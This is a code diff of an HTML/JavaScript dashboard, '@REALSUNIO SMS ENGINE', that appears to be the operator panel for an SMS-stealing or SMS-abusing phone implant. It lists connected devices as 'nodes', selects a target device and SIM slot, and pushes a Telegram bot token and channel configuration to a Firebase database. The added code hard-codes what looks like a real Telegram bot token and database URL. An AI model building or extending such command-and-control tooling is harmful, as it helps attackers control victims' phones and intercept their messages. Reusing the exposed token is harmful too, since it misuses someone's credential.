@@ -1,171 +1,66 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>@REALSUNIO | VIP Stealth v6.0</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&display=swap" rel="stylesheet">
+    <title>REALSUNIO SMS DASHBOARD</title>
     <style>
-        body { background: #050005; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
-        .pink-glow { text-shadow: 0 0 20px #ff007f; }
-        .pink-border { border: 1px solid #ff007f; box-shadow: 0 0 15px rgba(255, 0, 127, 0.2); }
-        .orbitron { font-family: 'Orbitron', sans-serif; }
-        #loader {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 9999; display: none;
-            flex-direction: column; align-items: center; justify-content: center;
-        }
-        .bar-container { width: 250px; height: 3px; background: #1a000a; margin-top: 25px; border-radius: 10px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: #ff007f; box-shadow: 0 0 15px #ff007f; transition: width 0.4s ease; }
+        body { font-family: sans-serif; background: #121212; color: white; padding: 20px; }
+        .card { background: #1e1e1e; padding: 20px; border-radius: 10px; margin-bottom: 10px; }
+        button { padding: 10px 20px; cursor: pointer; border: none; border-radius: 5px; }
+        .btn-sync { background: #007bff; color: white; }
+        .btn-test { background: #28a745; color: white; margin-left: 10px; }
+        #log-window { background: black; height: 150px; overflow-y: auto; padding: 10px; font-family: monospace; border: 1px solid #444; margin-top: 10px; }
+        .log-success { color: #00ff00; }
+        .log-error { color: #ff4444; }
+        .log-info { color: #00ccff; }
     </style>
 </head>
-<body class="text-zinc-200">
+<body>
 
-    <div id="loader">
-        <img src="https://via.placeholder.com/100/ff007f/ffffff?text=SUNIO" class="rounded-full mb-4 pink-border animate-bounce">
-        <h1 class="orbitron pink-glow text-3xl text-[#ff007f]">@REALSUNIO</h1>
-        <p id="loadText" class="text-[9px] tracking-[0.5em] text-pink-500 mt-4 uppercase font-bold text-center px-4">Establishing Secure Connection...</p>
-        <div class="bar-container">
-            <div id="progressBar" class="progress-bar"></div>
-        </div>
+    <div class="card">
+        <h2>@REALSUNIO SMS ENGINE v9.9</h2>
+        <input type="text" id="channelId" placeholder="Channel ID (e.g. -100...)" style="width:250px; padding:8px;">
+        <button class="btn-sync" onclick="syncEngine()">Sync Engine</button>
+        <button class="btn-test" onclick="testEngine()">Test Engine</button>
     </div>
 
-    <audio id="beep" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>
-
-    <div id="mainContent">
-        <header class="p-5 border-b border-pink-900/40 bg-black/90 flex justify-between items-center">
-            <h1 class="text-2xl font-black orbitron pink-glow text-[#ff007f]">@REALSUNIO</h1>
-            <div id="status" class="text-[10px] font-bold text-pink-800 uppercase tracking-widest">Awaiting JSON Injection</div>
-        </header>
-
-        <main class="max-w-7xl mx-auto p-8 grid grid-cols-1 lg:grid-cols-12 gap-8">
-            <div class="lg:col-span-4 space-y-6">
-                <div class="bg-zinc-900/30 p-6 rounded-[2rem] pink-border">
-                    <input type="file" id="jsonFile" accept=".json" class="hidden">
-                    <button onclick="document.getElementById('jsonFile').click()" class="w-full bg-pink-600/10 hover:bg-pink-600/20 py-4 rounded-2xl text-pink-500 text-xs font-bold border border-pink-900/50 mb-6 transition-all">
-                        UPLOAD CLOUD JSON
-                    </button>
-                    <div class="space-y-4">
-                        <input type="password" id="tgToken" placeholder="Bot Token" class="w-full bg-black p-4 rounded-xl text-xs outline-none border border-pink-900/30 focus:border-pink-500">
-                        <input type="text" id="channelId" placeholder="Channel ID (-100...)" class="w-full bg-black p-4 rounded-xl text-xs outline-none border border-pink-900/30 focus:border-pink-500">
-                        <button onclick="saveConfig()" class="w-full bg-[#ff007f] hover:bg-[#ff3399] py-4 rounded-2xl text-white font-bold text-xs shadow-lg transition-all active:scale-95 uppercase">Sync Engine</button>
-                    </div>
-                </div>
-            </div>
-
-            <div class="lg:col-span-4 bg-zinc-900/30 p-8 rounded-[2rem] pink-border min-h-[500px]">
-                <h2 class="text-xs font-bold mb-8 text-pink-400 orbitron italic tracking-widest">// ACTIVE NODES</h2>
-                <div id="noDevices" class="text-center py-24 opacity-30 text-[10px] uppercase tracking-widest">Scanning Firebase...</div>
-                <div id="deviceList" class="grid grid-cols-1 gap-4"></div>
-                <div id="simControl" class="hidden mt-10 pt-10 border-t border-pink-900/30">
-                    <div class="flex gap-4">
-                        <button id="s1" onclick="selectSim(1)" class="flex-1 py-6 bg-black rounded-2xl border-2 border-pink-900 text-[10px] font-bold tracking-widest hover:border-pink-500">SIM 01</button>
-                        <button id="s2" onclick="selectSim(2)" class="flex-1 py-6 bg-black rounded-2xl border-2 border-pink-900 text-[10px] font-bold tracking-widest hover:border-pink-500">SIM 02</button>
-                    </div>
-                </div>
-            </div>
-
-            <div class="lg:col-span-4 bg-black/50 p-6 rounded-[2rem] pink-border h-[500px] flex flex-col">
-                <h2 class="text-[10px] font-bold mb-4 text-pink-400 orbitron">LIVE TERMINAL</h2>
-                <div id="logs" class="flex-1 overflow-y-auto font-mono text-[9px] space-y-2 text-pink-300/40"></div>
-            </div>
-        </main>
+    <div class="card">
+        <h3>Live Activity Logs</h3>
+        <div id="log-window">Connecting to logs...</div>
     </div>
 
     <script>
-        let db;
-        const loader = document.getElementById('loader');
-        const pBar = document.getElementById('progressBar');
+        const DB_URL = "https://xooejtvks-default-rtdb.firebaseio.com";
 
-        const addLog = (m) => {
-            const l = document.getElementById('logs');
-            l.innerHTML = `<div><span class="text-pink-600">[${new Date().toLocaleTimeString()}]</span> ${m}</div>` + l.innerHTML;
-        };
-
-        document.getElementById('jsonFile').onchange = (e) => {
-            const file = e.target.files[0];
-            if(!file) return;
-
-            loader.style.display = 'flex';
-            let progress = 0;
-            const timer = setInterval(() => {
-                progress += 5;
-                pBar.style.width = progress + '%';
-                if(progress >= 100) clearInterval(timer);
-            }, 50);
-
-            const reader = new FileReader();
-            reader.onload = (ev) => {
-                try {
-                    const config = JSON.parse(ev.target.result);
-                    const pid = config.project_info.project_id;
-                    // FIX: Agar URL khali hai toh manual format banao
-                    const dbUrl = `https://${pid}-default-rtdb.firebaseio.com`;
-
-                    if (!firebase.apps.length) {
-                        firebase.initializeApp({ databaseURL: dbUrl, projectId: pid });
-                    }
-                    db = firebase.database();
-                    
-                    db.ref('realsunio_sync/full_config').set(config).then(() => {
-                        setTimeout(() => {
-                            loader.style.display = 'none';
-                            document.getElementById('beep').play();
-                            document.getElementById('status').innerText = "LIVE: " + pid.toUpperCase();
-                            document.getElementById('status').classList.add('text-pink-500');
-                            addLog("Cloud Core Injected Successfully");
-                            listenForDevices();
-                        }, 1500);
-                    });
-                } catch(err) { loader.style.display = 'none'; alert("Invalid JSON!"); }
-            };
-            reader.readAsText(file);
-        };
-
-        function listenForDevices() {
-            // Check both common paths
-            db.ref('/').on('value', snap => {
-                const list = document.getElementById('deviceList');
-                const empty = document.getElementById('noDevices');
-                list.innerHTML = '';
-                
-                const data = snap.val();
-                const devices = data.devices || data; // Auto-detect path
-                
-                if(devices && typeof devices === 'object') {
-                    empty.classList.add('hidden');
-                    Object.keys(devices).forEach(key => {
-                        if(key === 'app_config' || key === 'realsunio_sync' || key === 'commands') return;
-                        const card = document.createElement('div');
-                        card.className = "p-5 bg-zinc-950 rounded-2xl border border-pink-900/50 cursor-pointer hover:border-pink-500 transition-all group";
-                        card.innerHTML = `<div class="flex justify-between items-center"><span class="text-xs font-bold group-hover:text-pink-500">📱 ${key}</span><div class="h-2 w-2 rounded-full bg-pink-500 animate-pulse"></div></div>`;
-                        card.onclick = () => {
-                            db.ref('app_config/active_device').set(key);
-                            document.getElementById('simControl').classList.remove('hidden');
-                            addLog(`Node Target: ${key}`);
-                        };
-                        list.appendChild(card);
-                    });
-                }
+        // Testing Function
+        function testEngine() {
+            alert("Sending test signal... Check Pydroid/Telegram!");
+            // Push a test command to Firebase
+            fetch(`${DB_URL}/last_log.json`, {
+                method: 'PUT',
+                body: JSON.stringify({msg: "[UI] Test Button Clicked", type: "info", ts: Date.now()})
             });
         }
 
-        function selectSim(s) {
-            db.ref('app_config/active_sim_slot').set(s);
-            document.getElementById('s1').style.borderColor = s==1 ? '#ff007f' : '#1a000a';
-            document.getElementById('s2').style.borderColor = s==2 ? '#ff007f' : '#1a000a';
-            addLog(`Sim Slot ${s} Locked`);
+        function syncEngine() {
+            let cid = document.getElementById('channelId').value;
+            fetch(`${DB_URL}/app_config.json`, {
+                method: 'PATCH',
+                body: JSON.stringify({channelId: cid, tgToken: "7978593529:AAFeC7_9nMxb9qVmWHGg4KJ63GPzjVQvIQo"})
+            }).then(() => alert("Engine Synced!"));
         }
 
-        function saveConfig() {
-            const t = document.getElementById('tgToken').value;
-            const c = document.getElementById('channelId').value;
-            if(!db) return;
-            db.ref('app_config').update({ tgToken: t, channelId: c });
-            addLog("Engine Credentials Synced");
-        }
+        // Live Log Reader
+        setInterval(() => {
+            fetch(`${DB_URL}/last_log.json`)
+            .then(res => res.json())
+            .then(data => {
+                if(data) {
+                    let logWin = document.getElementById('log-window');
+                    let logClass = "log-" + data.type;
+                    logWin.innerHTML = `<div class="${logClass}">${data.msg}</div>` + logWin.innerHTML;
+                }
+            });
+        }, 3000);
     </script>
 </body>
 </html>
